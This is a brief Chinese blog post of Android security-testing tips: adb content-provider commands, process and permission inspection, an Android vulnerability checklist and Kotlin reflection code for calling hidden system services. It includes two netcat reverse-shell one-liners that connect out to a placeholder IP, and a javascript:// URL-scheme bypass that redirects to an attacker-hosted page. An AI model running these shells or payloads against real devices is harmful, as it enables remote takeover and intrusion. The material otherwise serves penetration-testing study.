---
title: 小知识
slug: blog/discussion-1/
number: 1
url: https://github.com/CloveIso/notes/discussions/1
date:
  created: 2024-11-19
  updated: 2024-11-21
created: 2024-11-19
updated: 2024-11-21
authors: [Cloveiso]
categories: []
comments: true
---

<!-- 小知识 -->
<!-- more -->
1、应用对应的uid  /data/system/packages.list

2、adb操作provider

```
content query --uri content://icc/adn 
content delete --uri content://settings/settings/pointer_speed
content insert --uri content://settings/settings --bind name:s:my_number --bind value:i:2
```

3、android 反弹shell

```
rm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/bin/sh -i 2>&1|nc ip 2222 >/data/local/tmp/f
nc ip 2222|/bin/sh|nc ip 6666
```

4、查看进程状态和uid状态

```
dumpsys activity processes | grep UidRecord -C 2
```

5、协议绕过

javascript://www.baidu.com/%0D%0Awindow.location.href='http://ip/js_poc.html'

6、android漏洞总结

```
1、activity
越权绕过、钓鱼欺诈/Activity劫持、隐式启动Intent包含敏感数据、拒绝服务攻击、intent重定向
2、service
权限提升漏洞、service劫持、消息伪造、拒绝服务攻击
3、broadcast reciver
敏感信息泄漏漏洞、权限绕过漏洞、消息伪造、拒绝服务
4、provider
信息泄露、sql注入、目录遍历

```

7、调用系统服务

```kotlin
try {
    val getServiceMethod = Class.forName("android.os.ServiceManager").getMethod(
        "getService",
        String::class.java
    )
    val binder = getServiceMethod(null, "companiondevice") as IBinder
    val clsStub = Class.forName("android.companion.ICompanionDeviceManager\$Stub")
    val asInterfaceMethod = clsStub.getDeclaredMethod("asInterface", IBinder::class.java)
    val service = asInterfaceMethod(null, binder)
    val clsProxy = Class.forName("IService\$Stub\$Proxy")
    val testMethod = clsProxy.getDeclaredMethod(
        "MethodName", // change the method name
        Float::class.java, Int::class.java, Long::class.java, Long::class.java // method args
    )
    testMethod(service, 10)
} catch (e: Exception) {
    e.printStackTrace()
}
```

8、查看权限等级

```
pm list permissions -f (经常报错)
dumpsys package | grep -F "Permission [android.permission.DEVICE_POWER]" -C 3
```

